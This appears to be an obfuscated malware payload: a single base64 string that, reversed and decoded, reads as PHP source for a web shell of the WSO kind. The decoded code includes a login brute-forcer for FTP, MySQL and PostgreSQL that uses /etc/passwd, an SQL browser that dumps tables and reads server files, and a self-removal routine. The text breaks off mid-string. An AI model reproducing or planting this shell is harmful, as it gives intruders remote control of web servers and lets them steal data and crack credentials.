TeU0+IiBvaGNlCjsnZGV0Y2VsZXMnIG9oY2UpJ2xxc3ltJz09XSdlcHl0J1tUU09QXyRAKGZpICAgIAo7IiAnbHFzeW0nPWV1bGF2IG5vaXRwbzw+J2VweXQnPWVtYW4gdGNlbGVzPD5kdDwKPiciLiApJyc6XSd0ZXNyYWhjJ1tUU09QXyQ/KV0ndGVzcmFoYydbVFNPUF8kKHRlc3NpKCAuIic9ZXVsYXYgdGVzcmFoYz1lbWFuIG5lZGRpaD1lcHl0IHR1cG5pPD4nIi4gKV0nZHdjJ1tTTEFCT0xHJChzcmFoY2xhaWNlcHNsbXRoIC4iJz1ldWxhdiBjPWVtYW4gbmVkZGloPWVweXQgdHVwbmk8PicnPWV1bGF2IDJwPWVtYW4gbmVkZGloPWVweXQgdHVwbmk8Pid5cmV1cSc9ZXVsYXYgMXA9ZW1hbiBuZWRkaWg9ZXB5dCB0dXBuaTw+bHFTPWV1bGF2IGE9ZW1hbiBuZWRkaWg9ZXB5dCB0dXBuaTwKPnJ0PD5ydC88PmR0Lzw+ZHQ8PmR0Lzxlc2FiYXRhRD5kdDw+ZHQvPGRyb3dzc2FQPmR0PD5kdC88bmlnb0w+ZHQ8PmR0Lzx0c29IPmR0PD5kdC88ZXB5VD5kdDwKPnJ0PD4nMCc9Z25pY2Fwc2xsZWMgJzInPWduaWRkYXBsbGVjIGVsYmF0PD4nOylzaWh0KHNmJz10aW1idXNubyAndHNvcCc9ZG9odGVtICdmcyc9ZW1hbiBtcm9mPAo+dG5ldG5vYz1zc2FsYyB2aWQ8PjFoLzxyZXN3b3JiIGxxUz4xaDwKIiBvaGNlCQo7KShyZWRhZUhvc3cJCn0JCjspJz50cGlyY3MvPCkxLShrY2FiLnlyb3RzaWgud29kbml3OykiZWxpZiBuZXBvIHQnXG5hQyAhcm9yckUiKHRyZWxhPnRwaXJjczwnKGVpZCAgICAgICAgICAgIAplc2xlIH0gICAgICAgIAo7KV0nMnAnW1RTT1BfJCh0ZXNudSAgICAgICAgICAgIAo7KXBmJChlc29sY2YgICAgICAgICAgICAKOylwZiQgLHYkKHBtdWQ+LWJkJCAgICAgICAgICAgICAgICAKKXYkIHNhIF0nbGJ0J1tUU09QXyQoaGNhZXJvZiAgICAgICAgICAgIAp7ICkpJ3cnICxdJ2VsaWYnW1RTT1BfJChuZXBvZkAgPSBwZiQoZmllc2xlIH0gICAgICAgIAo7dGl4ZSAgICAgICAgICAgIAo7KXYkKHBtdWQ+LWJkJAkJCQkKKXYkIHNhIF0nbGJ0J1tUU09QXyQoaGNhZXJvZiAgICAgICAgICAgIAo7KSJuaWFscC90eGV0IDplcHlULXRuZXRub0MiKHJlZGFlaCAgICAgICAgICAgIAo7KSJscXMucG11ZD1lbWFuZWxpZiA7dG5lbWhjYXR0YSA6bm9pdGlzb3BzaUQtdG5ldG5vQyIocmVkYWVoICAgICAgICAgICAgCjspNjkwNCAsInJlbGRuYWh6Z19ibyIodHJhdHNfYm8gICAgICAgICAgICAKeyApKV0nZWxpZidbVFNPUF8kKHl0cG1lKGZpICAgICAgICAKfSAgICAgICAgCjtrYWVyYiA7KSc2NjhwYycodGVzcmFoQ3Rlcz4tYmQkIDoiNjY4cGMiIGVzYWMgICAgICAgICAgICAKO2thZXJiIDspJ3U4aW9rJyh0ZXNyYWhDdGVzPi1iZCQgOiJVLThJT0siIGVzYWMgICAgICAgICAgICAKO2thZXJiIDspJ3I4aW9rJyh0ZXNyYWhDdGVzPi1iZCQgOiJSLThJT0siIGVzYWMgICAgICAgICAgICAKO2thZXJiIDspJzhmdHUnKHRlc3JhaEN0ZXM+LWJkJCA6IjgtRlRVIiBlc2FjICAgICAgICAgICAgCjtrYWVyYiA7KScxNTIxcGMnKHRlc3JhaEN0ZXM+LWJkJCA6IjE1MjEtc3dvZG5pVyIgZXNhYyAgICAgICAgICAgIAp7ICldJ3Rlc3JhaGMnW1RTT1BfJChoY3Rpd3MgICAgICAgIAo7KV0nZXNhYl9scXMnW1RTT1BfJChiZHRjZWxlcz4tYmQkCQkKOyldJ2VzYWJfbHFzJ1tUU09QXyQgLF0nc3NhcF9scXMnW1RTT1BfJCAsXSduaWdvbF9scXMnW1RTT1BfJCAsXSd0c29oX2xxcydbVFNPUF8kKHRjZW5ub2M+LWJkJAkJCnsgKSkndGNlbGVzJz0hXScxcCdbVFNPUF8kQCggJiYgKSdkYW9sbndvZCc9PV0nMnAnW1RTT1BfJEAoKGZpCQo7KV0nZXB5dCdbVFNPUF8kKHNzYWxDYkQgd2VuID0gYmQkCQo7fQkKfQkJCjtlc2xhZiBucnV0ZXIJCQkKfQkJCQo7a2FlcmIJCQkJCn0JCQkJCQo7KWxxcyQob2hjZSBlc2xlIDspbHFzJCAscGYkKGV0aXJ3ZiApcGYkKGZpICAgICAgICAgICAgICAgICAgICAgICAgCjsiblwiLic7KScuKW1ldGkkICwiICwiKGVkb2xwbWkuJyggU0VVTEFWICknLilzbm11bG9jJCAsIiAsIihlZG9scG1pLicoICcuZWxiYXQkLicgT1ROSSBUUkVTTkknID0gbHFzJCAgICAgICAgICAgICAgICAgICAgICAgIAp9CQkJCQkJCjtrJCA9IF1bc25tdWxvYyQJCQkJCQkJCjsiJyIuKXYkKHNlaHNhbHNkZGEuIiciID0gXWskW21ldGkkCQkJCQkJCQp7ICl2JD49ayQgc2EgbWV0aSQoaGNhZXJvZgkJCQkJCQo7KSh5YXJyYSA9IHNubXVsb2MkCQkJCQkJCnsgKSkoaGN0ZWY+LXNpaHQkID0gbWV0aSQoZWxpaHcJCQkJCQo7KWVsYmF0JC4nIE1PUkYgKiBUQ0VMRVMnKHlyZXVxPi1zaWh0JAkJCQkJCjonbHFzZ3AnIGVzYWMJCQkJCjtrYWVyYgkJCQkKOykiblxuXDsiKG9oY2UgZXNsZSA7KSJuXG5cOyIgLHBmJChldGlyd2YgKXBmJChmaSAgICAgICAgICAgICAgICAgICAgICAgIAopZGFlaCQhKGZpICAgICAgICAgICAgICAgICAgICAKfQkJCQkJCjsrK2kkICAgICAgICAgICAgICAgICAgICAgICAgCjspbHFzJChvaGNlIGVzbGUgOylscXMkICxwZiQoZXRpcndmIClwZiQoZmkgICAgICAgICAgICAgICAgICAgICAgICAKOycpJy4pbWV0aSQgLCIgLCIoZWRvbHBtaS4iKCx0XG5cIiA9LiBscXMkICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplc2xlIH0gICAgICAgICAgICAgICAgICAgICAgICAKO2VzbGFmID0gZGFlaCQgICAgICAgICAgICAgICAgICAgICAgICAgICAgCjsnKScuKW1ldGkkICwiICwiKGVkb2xwbWkuIih0XG5cIFNFVUxBViApIi4pc25tdWxvYyQgLCIgLCIoZWRvbHBtaS4nKCBgJy5lbGJhdCQuJ2AgT1ROSSBUUkVTTkknID0uIGxxcyQgICAgICAgICAgICAgICAgICAgICAgICAgICAgCnsgKWRhZWgkKGZpICAgICAgICAgICAgICAgICAgICAgICAgCn0JCQkJCQkKOyJgIi5rJC4iYCIgPSBdW3NubXVsb2MkCQkJCQkJCQo7IiciLil2JChnbmlydHNfZXBhY3NlX2xhZXJfbHFzeW1ALiInIiA9IF1rJFttZXRpJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCmVzbGUgICAgICAgICAgICAgICAgICAgICAgICAgICAgCjt2JCA9IF1rJFttZXRpJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCikpdiQodG5pX3NpKGZpZXNsZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAKOyJMTFVOIiA9IF1rJFttZXRpJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCilsbHVuID09PSB2JChmaSAgICAgICAgICAgICAgICAgICAgICAgICAgICAKeyApdiQ+PWskIHNhIG1ldGkkKGhjYWVyb2YJCQkJCQkKOykoeWFycmEgPSBzbm11bG9jJAkJCQkJCQoKfSAgICAgICAgICAgICAgICAgICAgICAgIAo7Im5cblw7IiA9IGxxcyQgICAgICAgICAgICAgICAgICAgICAgICAgICAgCjtldXJ0ID0gZGFlaCQgICAgICAgICAgICAgICAgICAgICAgICAgICAgCnsgKTAgPT0gMDAwMSAlIGkkKGZpICAgICAgICAgICAgICAgICAgICAgICAgCjsnJyA9IGxxcyQgICAgICAgICAgICAgICAgICAgICAgICAKeyApKShoY3RlZj4tc2lodCQgPSBtZXRpJChlbGlodwkJCQkJCjtldXJ0ID0gZGFlaCQgICAgICAgICAgICAgICAgICAgIAo7MCA9IGkkICAgICAgICAgICAgICAgICAgICAKOyknYCcuZWxiYXQkLidgIE1PUkYgKiBUQ0VMRVMnKHlyZXVxPi1zaWh0JAkJCQkJCjspbHFzJChvaGNlIGVzbGUgOylscXMkICxwZiQoZXRpcndmIClwZiQoZmkgICAgICAgICAgICAgICAgICAgIAo7Im5cOyIuXTFbZXRhZXJjJCA9IGxxcyQJCQkJCQo7KXNlciQoeWFycmFfaGN0ZWZfbHFzeW0gPSBldGFlcmMkCQkJCQkKOyknYCcuZWxiYXQkLidgIEVMQkFUIEVUQUVSQyBXT0hTJyh5cmV1cT4tc2lodCQgPSBzZXIkCQkJCQkKOidscXN5bScgZXNhYwkJCQkKewkpZXB5dD4tc2lodCQoaGN0aXdzCQkJCnsgKWVzbGFmID0gcGYkICxlbGJhdCQocG11ZCBub2l0Y251ZgkJCn0JCQo7ZXNsYWYgbnJ1dGVyCQkJCn0JCQkKO2thZXJiCQkJCQo7KSlyJCwiblwiKGVkb2xwbWk+PSdlbGlmJyh5YXJyYSBucnV0ZXIJCQkJCQo7KScyb3N3IGVsYmF0IHBvcmQnKHlyZXVxPi1zaWh0JAkJCQkJCjtdJ2VsaWYnW2kkID0gXVtyJAkJCQkJCQopKShoY3RlZj4tc2lodCQ9aSQoZWxpaHcJCQkJCQo7KSh5YXJyYT1yJAkJCQkJCjspIjsyb3N3IG1vcmYgZWxpZiB0Y2VsZXM7JyIuKXJ0cyQoc2Voc2Fsc2RkYS4iJyBNT1JGIDJvc3cgWVBPQzspdHhldCBlbGlmKDJvc3cgRUxCQVQgRVRBRVJDIih5cmV1cT4tc2lodCQJCQkJCQo6J2xxc2dwJyBlc2FjCQkJCQo7a2FlcmIJCQkJCjspKSJlbGlmIHNhICknIi4pcnRzJChzZWhzYWxzZGRhLiInKEVMSUZfREFPTCBUQ0VMRVMiKHlyZXVxPi1zaWh0JChoY3RlZj4tc2lodCQgbnJ1dGVyCQkJCQkKOidscXN5bScgZXNhYwkJCQkKewkpZXB5dD4tc2lodCQoaGN0aXdzCQkJCnsgKXJ0cyQoZWxpRmRhb2wgbm9pdGNudWYJCQp9CQkKO2VzbGFmIG5ydXRlcgkJCQp9CQkJCjtrYWVyYgkJCQkJCjspcnRzJCAsa25pbD4tc2lodCQoZ25pZG9jbmVfdG5laWxjX3Rlc19ncEAgbnJ1dGVyCQkJCQkKOidscXNncCcgZXNhYwkJCQkKO2thZXJiCQkJCQkKOylydHMkLicgVEVTUkFIQyBURVMnKHlyZXVxPi1zaWh0JAkJCQkJCQplc2xlCQkJCQkKOylrbmlsPi1zaWh0JCAscnRzJCh0ZXNyYWhjX3Rlc19scXN5bUAgbnJ1dGVyCQkJCQkJCikpJ3Rlc3JhaGNfdGVzX2xxc3ltJyhzdHNpeGVfbm9pdGNudWYoZmkJCQkJCQo6J2xxc3ltJyBlc2FjCQkJCQp7CSllcHl0Pi1zaWh0JChoY3Rpd3MJCQkKeyApcnRzJCh0ZXNyYWhDdGVzIG5vaXRjbnVmCQkKfQkJCjtlc2xhZiBucnV0ZXIJCQkKfQkJCQo7a2FlcmIJCQkJCjspKHJvcnJlX3RzYWxfZ3BAIG5ydXRlcgkJCQkJCjonbHFzZ3AnIGVzYWMJCQkJCjtrYWVyYgkJCQkKOykocm9ycmVfbHFzeW1AIG5ydXRlcgkJCQkJCjonbHFzeW0nIGVzYWMJCQkJCnsJKWVweXQ+LXNpaHQkKGhjdGl3cwkJCQp7ICkocm9ycmUgbm9pdGNudWYJCQp9CQkKO2VzbGFmIG5ydXRlcgkJCQp9CQkJCjtrYWVyYgkJCQkKOykiJ2dvbGF0YWNfZ3AnID0hIGFtZWhjc19lbGJhdCBETkEgJ2FtZWhjc19ub2l0YW1yb2ZuaScgPSEgYW1laGNzX2VsYmF0IGVyZWh3IHNlbGJhdC5hbWVoY3Nfbm9pdGFtcm9mbmkgbW9yZiBlbWFuX2VsYmF0IHRjZWxlcyIoeXJldXE+LXNpaHQkID0gc2VyPi1zaWh0JCBucnV0ZXIJCQkJCQo6J2xxc2dwJyBlc2FjCQkJCQo7a2FlcmIJCQkJCjspJ1NFTEJBVCBXT0hTJyh5cmV1cT4tc2lodCQgPSBzZXI+LXNpaHQkIG5ydXRlcgkJCQkJCjonbHFzeW0nIGVzYWMJCQkJCnsJKWVweXQ+LXNpaHQkKGhjdGl3cwkJCQp7ICkoc2VsYmFUdHNpbCBub2l0Y251ZgkJCn0JCQo7ZXNsYWYgbnJ1dGVyCQkJCn0JCQkKO2thZXJiCQkJCQo7KSIndCc9IWV0YWxwbWV0c2l0YWQgRVJFSFcgZXNhYmF0YWRfZ3AgTU9SRiBlbWFudGFkIFRDRUxFUyIoeXJldXE+LXNpaHQkID0gc2VyPi1zaWh0JCBucnV0ZXIJCQkJCQo6J2xxc2dwJyBlc2FjCQkJCQo7a2FlcmIJCQkJCjspInNlc2FiYXRhZCBXT0hTIih5cmV1cT4tc2lodCQgbnJ1dGVyICAgICAgICAgICAgICAgICAgICAgICAgCjonbHFzeW0nIGVzYWMJCQkJCnsJKWVweXQ+LXNpaHQkKGhjdGl3cwkJCQp7ICkoc2JEdHNpbCBub2l0Y251ZgkJCn0JCQo7ZXNsYWYgbnJ1dGVyCQkJCn0JCQkKO2thZXJiCQkJCQkKOylzZXIkKGNvc3NhX2hjdGVmX2dwQCBucnV0ZXIJCQkJCQo6J2xxc2dwJyBlc2FjCQkJCQo7a2FlcmIJCQkJCQo7KXNlciQoY29zc2FfaGN0ZWZfbHFzeW1AIG5ydXRlcgkJCQkJCjonbHFzeW0nIGVzYWMJCQkJCnsJKWVweXQ+LXNpaHQkKGhjdGl3cwkJCQo7c2VyPi1zaWh0JDopMChncmFfdGVnX2NudWY/KShzZ3JhX211bl9jbnVmID0gc2VyJAkJCQp7ICkoaGN0ZWYgbm9pdGNudWYJCQp9CQkKO2VzbGFmIG5ydXRlcgkJCQp9CQkJCjtrYWVyYgkJCQkJCjspcnRzJCxrbmlsPi1zaWh0JCh5cmV1cV9ncEAgPSBzZXI+LXNpaHQkIG5ydXRlcgkJCQkJCjonbHFzZ3AnIGVzYWMJCQkJCjtrYWVyYgkJCQkJCjspcnRzJCh5cmV1cV9scXN5bUAgPSBzZXI+LXNpaHQkIG5ydXRlcgkJCQkJCjonbHFzeW0nIGVzYWMJCQkJCnsgKWVweXQ+LXNpaHQkKGhjdGl3cwkJCQp7IClydHMkKHlyZXVxIG5vaXRjbnVmCQkKfQkJCjtlc2xhZiBucnV0ZXIJCQkKfQkJCQo7a2FlcmIJCQkJCQo7ZXVydCBucnV0ZXIpKWJkJChiZF90Y2VsZXNfbHFzeW1AKCBmaQkJCQkJCjonbHFzeW0nIGVzYWMJCQkJCnsJKWVweXQ+LXNpaHQkKGhjdGl3cwkJCQp7ICliZCQoYmR0Y2VsZXMgbm9pdGNudWYJCQp9CQkKO2VzbGFmIG5ydXRlcgkJCQp9CQkJCjtrYWVyYgkJCQkJCjtldXJ0IG5ydXRlciApICkiZW1hbmJkJD1lbWFuYmQgc3NhcCQ9ZHJvd3NzYXAgcmVzdSQ9cmVzdSB9XTFbdHNvaCR7PXRyb3AgfV0wW3Rzb2gkez10c29oIih0Y2Vubm9jX2dwQCA9IGtuaWw+LXNpaHQkIChmaQkJCQkJCjsyMzQ1PV0xW3Rzb2gkICldMVt0c29oJCEoZmkJCQkJCQo7KXRzb2gkICwnOicoZWRvbHB4ZSA9IHRzb2gkCQkJCQkKOidscXNncCcgZXNhYwkJCQkKO2thZXJiCQkJCQkKO2V1cnQgbnJ1dGVyICkgKWV1cnQsc3NhcCQscmVzdSQsdHNvaCQodGNlbm5vY19scXN5bUAgPSBrbmlsPi1zaWh0JCAoZmkJCQkJCQo6J2xxc3ltJyBlc2FjCQkJCQp7CSllcHl0Pi1zaWh0JChoY3Rpd3MJCQkKeyllbWFuYmQkICxzc2FwJCAscmVzdSQgLHRzb2gkKHRjZW5ub2Mgbm9pdGNudWYJCQp9CQkKO2VweXQkID0gZXB5dD4tc2lodCQJCQkKewkpZXB5dCQoc3NhbENiRCBub2l0Y251ZgkJCjtzZXIkIHJhdgkJCjtrbmlsJCByYXYJCQo7ZXB5dCQgcmF2CQkKeyBzc2FsQ2JEIHNzYWxjCQp7ICkobHFTbm9pdGNhIG5vaXRjbnVmCgp9CjspKHJldG9vRm9zdwkKOyc+cmI8PnZpZC88JyBvaGNlCQo7Jz5lbGJhdC88Pm1yb2YvPD5ydC88PmR0Lzw+Ij4+Ij1ldWxhdiB0aW1idXM9ZXB5dCB0dXBuaTw+ZHQ8PmR0Lzw+ZHQ8PnJ0PD5ydC88PmR0LzwnLgkJCic+ZWxiYXQvPD5ydC88PmR0Lzw+ImNpZC5kd3NzYXAnLildJ2R3YydbU0xBQk9MRyQoc3JhaGNsYWljZXBzbG10aC4nIj1ldWxhdiB0Y2lkPWVtYW4gdHhldD1lcHl0IHR1cG5pPD5kdDwnLgkJCic+ZHQvPD5uYXBzLzx5cmFub2l0Y2lEPm5hcHM8PmR0PD5ydDwnLgkJCic+cnQvPD5kdC88PiJ0b29yIj1ldWxhdiBuaWdvbD1lbWFuIHR4ZXQ9ZXB5dCB0dXBuaTw+ZHQ8Jy4JCQonPmR0Lzw+bmFwcy88bmlnb0w+bmFwczw+ZHQ8PnJ0PD4ieHA1MTp0ZmVsLWduaWRkYXAiPWVseXRzIGVsYmF0PD5kdDw+ZHQvPD5kdDw+cnQ8Jy4JCQonPnJ0Lzw+ZHQvPD5sZWJhbC88eXJhbm9pdGNpRCA+IjIiPWV1bGF2IGVweXQ9ZW1hbiBvaWRhcj1lcHl0IHR1cG5pPD5sZWJhbDw+ZHQ8PmR0Lzw+ZHQ8PnJ0PCcuCQkKJz5ydC88PmR0Lzw+bGViYWwvPClsb2dpbiA+LSBuaWdvbCggZXNyZXZlciA+ZGVrY2VoYyAxPWV1bGF2IGVzcmV2ZXI9ZW1hbiB4b2JrY2VoYz1lcHl0IHR1cG5pPD4ieHA1MTp0ZmVsLWduaWRkYXAiPWVseXRzIGxlYmFsPD5kdDw+ZHQvPD5kdDw+cnQ8Jy4JCQonPnJ0Lzw+ZHQvPD5sZWJhbC88ZHdzc2FwL2N0ZS8gPmRla2NlaGMgIjEiPWV1bGF2IGVweXQ9ZW1hbiBvaWRhcj1lcHl0IHR1cG5pPD5sZWJhbDw+ZHQ8Jy4JCQonPmR0Lzw+bmFwcy88ZXB5dCBldHVyQj5uYXBzPD5kdDw+cnQ8Jy4JCQonPnJ0Lzw+ZHQvPD4iMS4wLjAuNzIxIj1ldWxhdiByZXZyZXM9ZW1hbiB0eGV0PWVweXQgdHVwbmk8PmR0PCcuCQkKJz5kdC88Pm5hcHMvPHRyb3A6cmV2cmVTPm5hcHM8Jy4JCQonPiInLildJ3Rlc3JhaGMnW1RTT1BfJChzcmFoY2xhaWNlcHNsbXRoLiciPWV1bGF2IHRlc3JhaGM9ZW1hbiBuZWRkaWg9ZXB5dCB0dXBuaTwnLgkJCic+IicuKV0nYSdbVFNPUF8kKHNyYWhjbGFpY2Vwc2xtdGguJyI9ZXVsYXYgYT1lbWFuIG5lZGRpaD1lcHl0IHR1cG5pPCcuCQkKJz4iJy4pXSdkd2MnW1NMQUJPTEckKHNyYWhjbGFpY2Vwc2xtdGguJyI9ZXVsYXYgYz1lbWFuIG5lZGRpaD1lcHl0IHR1cG5pPCcuCQkKJz5kdDw+cnQ8PnJ0Lzw+ZHQvPD50Y2VsZXMvPD5ub2l0cG8vPGxxU2VyZ3Rzb1A+bHFzZ3A9ZXVsYXYgbm9pdHBvPD5ub2l0cG8vPGxxU3lNPmxxc3ltPWV1bGF2IG5vaXRwbzw+bm9pdHBvLzxQVEY+cHRmPWV1bGF2IG5vaXRwbzw+b3RvcnA9ZW1hbiB0Y2VsZXM8PmR0PCcuCQkKJz5kdC88Pm5hcHMvPGVweVQ+bmFwczw+ZHQ8PnJ0PD50c29wPWRvaHRlbSBtcm9mPD5lbGJhdDw+dG5ldG5vYz1zc2FsYyB2aWQ8PjFoLzxlY3JvZmV0dXJCPjFoPCcgb2hjZQkKfQkKOyI+cmI8PnZpZC88c3NlY2N1cyQgPm5hcHMvPDpzc2VjY3VTPm5hcHM8IHN0cG1ldHRhJCA+bmFwcy88OnN0cG1ldHRBPm5hcHM8IiBvaGNlCQkKfQkJCn0JCQkJCn0JCQkJCQo7Jz5yYjwnLillbmlsJChzcmFoY2xhaWNlcHNsbXRoLic6PmIvPCcuKV0nbmlnb2wnW1RTT1BfJChzcmFoY2xhaWNlcHNsbXRoLic+YjwnIG9oY2UJCQkJCQkKOysrc3NlY2N1cyQJCQkJCQkKeyApICllbmlsJCAsXSduaWdvbCdbVFNPUF8kICxdMVtyZXZyZXMkQCxdMFtyZXZyZXMkKGVjcm9GZXR1ckJvc3cgKGZpCQkJCQkKO3N0cG1ldHRhJCsrCQkJCQkKOyllbmlsJChtaXJ0ID0gZW5pbCQJCQkJCQp7ICllbmlsJCBzYSBwbWV0JChoY2Flcm9mCQkJCQopIClwbWV0JCh5YXJyYV9zaSAoZmkJCQkKOyldJ3RjaWQnW1RTT1BfJChlbGlmQCA9IHBtZXQkCQkJCnsgKTIgPT0gXSdlcHl0J1tUU09QXyQoZmllc2xlIH0JCQp9CQkJCQp9CQkJCQkKfQkJCQkJCQo7KXBtdCQoc3JhaGNsYWljZXBzbG10aC4nOj5iLzwnLildMFtlbmlsJChzcmFoY2xhaWNlcHNsbXRoLic+YjwnIG9oY2UJCQkJCQkJCjsrK3NzZWNjdXMkCQkJCQkJCQp7ICkgKXBtdCQgLF0wW2VuaWwkICxdMVtyZXZyZXMkQCxdMFtyZXZyZXMkQChlY3JvRmV0dXJCb3N3IChmaQkJCQkJCQo7c3RwbWV0dGEkKysJCQkJCQkKO11pJFtdMFtlbmlsJCA9LiBwbXQkCQkJCQkJCQopaSQtLSA7MD0+aSQgOzEtKV0wW2VuaWwkKG5lbHJ0cz1pJChyb2YJCQkJCQkKOyIiID0gcG10JAkJCQkJCQp7ICldJ2VzcmV2ZXInW1RTT1BfJEAoZmkJCQkJCQp9CQkJCQkKOyc+cmI8Jy4pXTBbZW5pbCQoc3JhaGNsYWljZXBzbG10aC4nOj5iLzwnLildMFtlbmlsJChzcmFoY2xhaWNlcHNsbXRoLic+YjwnIG9oY2UJCQkJCQkKOysrc3NlY2N1cyQJCQkJCQkKeyApICldMFtlbmlsJCAsXTBbZW5pbCQgLF0xW3JldnJlcyRALF0wW3JldnJlcyRAKGVjcm9GZXR1ckJvc3cgKGZpCQkJCQkKO3N0cG1ldHRhJCsrCQkJCQkKOyllbmlsJCAsIjoiKGVkb2xweGUgPSBlbmlsJAkJCQkJCnsgKWVuaWwkIHNhIHBtZXQkKGhjYWVyb2YJCQkJCikgKXBtZXQkKHlhcnJhX3NpIChmaQkJCQo7KSdkd3NzYXAvY3RlLycoZWxpZkAgPSBwbWV0JAkJCQp7ICkxID09IF0nZXB5dCdbVFNPUF8kKGZpCQkKOyldJ3JldnJlcydbVFNPUF8kICwiOiIoZWRvbHB4ZSA9IHJldnJlcyQJCQo7MCA9IHN0cG1ldHRhJAkJCjswID0gc3NlY2N1cyQJCQp9CQkKfQkJCQo7c2VyJCBucnV0ZXIJCQkJCjspc2VyJChlc29sY19ncEAJCQkJCjspcnRzJCh0Y2Vubm9jX2dwQCA9IHNlciQJCQkJCjsic2VyZ3Rzb3A9ZW1hbmJkICciLnNzYXAkLiInPWRyb3dzc2FwICciLm5pZ29sJC4iJz1yZXN1ICciLnRyb3AkLiInPXRyb3AgJyIucGkkLiInPXRzb2giID0gcnRzJAkJCQkKeyApc3NhcCQsbmlnb2wkLHRyb3AkLHBpJChlY3JvRmV0dXJCb3N3IG5vaXRjbnVmCQkJCnsgKSAnbHFzZ3AnID09IF0nb3RvcnAnW1RTT1BfJCAoZmllc2xlIH0JCQp9CQkJCjtzZXIkIG5ydXRlcgkJCQkKOylzZXIkKGVzb2xjX2xxc3ltQAkJCQkKOylzc2FwJCAsbmlnb2wkICwpNjAzMzp0cm9wJD90cm9wJCguJzonLnBpJCh0Y2Vubm9jX2xxc3ltQCA9IHNlciQJCQkJCnsgKXNzYXAkLG5pZ29sJCx0cm9wJCxwaSQoZWNyb0ZldHVyQm9zdyBub2l0Y251ZgkJCQp7ICkgJ2xxc3ltJyA9PSBdJ290b3JwJ1tUU09QXyQgKGZpZXNsZSB9CQkKfQkJCQo7c2VyJCBucnV0ZXIJCQkJCjspcGYkKGVzb2xjX3B0ZkAJCQkJCjspc3NhcCQgLG5pZ29sJCAscGYkKG5pZ29sX3B0ZkAgPSBzZXIkCQkJCQo7ZXNsYWYgbnJ1dGVyIClwZiQhKGZpCQkJCQo7KTEyOnRyb3AkP3Ryb3AkICxwaSQodGNlbm5vY19wdGZAID0gcGYkCQkJCQp7IClzc2FwJCxuaWdvbCQsdHJvcCQscGkkKGVjcm9GZXR1ckJvc3cgbm9pdGNudWYJCQkKeyApICdwdGYnID09IF0nb3RvcnAnW1RTT1BfJCAoZmkJCQo7Jz5yYjwnLildJ3JldnJlcydbVFNPUF8kKHNyYWhjbGFpY2Vwc2xtdGguJyA+bmFwcy88OnJldnJlUz5uYXBzPCAnLildJ290b3JwJ1tUU09QXyQoc3JhaGNsYWljZXBzbG10aC4nID5uYXBzLzw6ZXB5VD5uYXBzPD50bmV0bm9jPXNzYWxjIHZpZDw+MWgvPHN0bHVzZVI+MWg8JyBvaGNlCQkKeyApICldJ290b3JwJ1tUU09QXyQodGVzc2kgKGZpCQo7KShyZWRhZUhvc3cJCnsgKShlY3JvZmV0dXJCbm9pdGNhIG5vaXRjbnVmCgp9CjspKHJldG9vRm9zdwkKOyc+dmlkLzw+YS88c2VZPiIpJ1xzZXknXCxsbHVuLGxsdW4oZyI9a2NpbGNubyAjPWZlcmggYTw+cmI8P2xsZWhzIGVodCBldm9tZXIgb3QgdG5hdyB5bGxhZVI+dG5ldG5vYz1zc2FsYyB2aWQ8PjFoLzxlZGljaXVTPjFoPCcgb2hjZQkKOykocmVkYWVIb3N3ICAgICAgICAKKSdzZXknID0hIF0nMXAnW1RTT1BfJChmaSAgICAKOychcm9ycmUga25pbG51JyBvaGNlCQkJCmVzbGUJCQo7KSdkZXZvbWVyIG5lZWIgc2FoIGxsZWhTJyhlaWQJCQkKKSkpZWxpZmVtYW4kICwnJyAsJyEqLnNcKVwrZFwoXCEnKGVjYWxwZXJfZ2VycChrbmlsbnVAKGZpCQkKKSdzZXknID09IF0nMXAnW1RTT1BfJChmaQkKfQkKOydsbXRocC4nLl0xWzJlbGlmZW1hbiQgPSBlbGlmZW1hbiQJCQo7KTJlbGlmZW1hbiQgLGVsaWZlbWFuJCAsIiNsbXRocC5cKSouKCMiKGhjdGFtX2dlcnAJCQp7KSllbGlmZW1hbiQgLCIvbG10aHAuXC8iKGhjdGFtX2dlcnAoZmllc2xlfQkKOyc3cGhwLicuXTFbMmVsaWZlbWFuJCA9IGVsaWZlbWFuJAkJCjspMmVsaWZlbWFuJCAsZWxpZmVtYW4kICwiIzdwaHAuXCkqLigjIihoY3RhbV9nZXJwCQkKeykpZWxpZmVtYW4kICwiLzdwaHAuXC8iKGhjdGFtX2dlcnAoZmllc2xlfQkKOyc1cGhwLicuXTFbMmVsaWZlbWFuJCA9IGVsaWZlbWFuJAkJCjspMmVsaWZlbWFuJCAsZWxpZmVtYW4kICwiIzVwaHAuXCkqLigjIihoY3RhbV9nZXJwCQkKeykpZWxpZmVtYW4kICwiLzVwaHAuXC8iKGhjdGFtX2dlcnAoZmllc2xlfQkKOydwaHAuJy5dMVsyZWxpZmVtYW4kID0gZWxpZmVtYW4kCQkKOykyZWxpZmVtYW4kICxlbGlmZW1hbiQgLCIjcGhwLlwpKi4oIyIoaGN0YW1fZ2VycAkJCnspKWVsaWZlbWFuJCAsIi9waHAuXC8iKGhjdGFtX2dlcnAoZmkJCjspX19FTElGX18oZW1hbmVzYWIgPSBlbGlmZW1hbiQJCnsgKShldm9tZVJmbGVTbm9pdGNhIG5vaXRjbnVmCgp9CjspJyFleWInKGVpZAkKOykwMDYzIC0gKShlbWl0ICwnJyAsKV0nVFNPSF9QVFRIJ1tSRVZSRVNfJCg1ZG0oZWlrb29jdGVzICAgIAp7ICkodHVvZ29Mbm9pdGNhIG5vaXRjbnVmCgp9CjspKHJldG9vRm9zdwkKOyc+dHBpcmNzLzw7KShzdWNvZi5kbWMuZmMuZD50cGlyY3M8PnZpZC88Pm1yb2YvPCcgb2hjZQkKOyc+ZWxiYXQvPD5ydC88PmR0Lzw+IjspdG5ldmUocGsiPW53b2R5ZWtubyAiOyUwMDE6aHRkaXc7eHAwOnJlZHJvYiI9ZWx5dHMgZG1jPWVtYW4gdHhldD1lcHl0IHR1cG5pPD5kdDw+ZHQvPCQ+IiUxIj1odGRpdyBkdDw+cnQ8PiIlMDAxIj1odGRpdyAwPWduaWNhcHNsbGVjIDA9Z25pZGRhcGxsZWMgIjt4cDA6cG90LXJlZHJvYjs1NTUjOnJvbG9jLWRudW9yZ2tjYWI7NWZkIyBkaWxvcyB4cDE6cmVkcm9iIj1lbHl0cyBlbGJhdDw+YWVyYXR4ZXQvPCcgb2hjZQkKfQkKOykpXScxcCdbVFNPUF8kKHh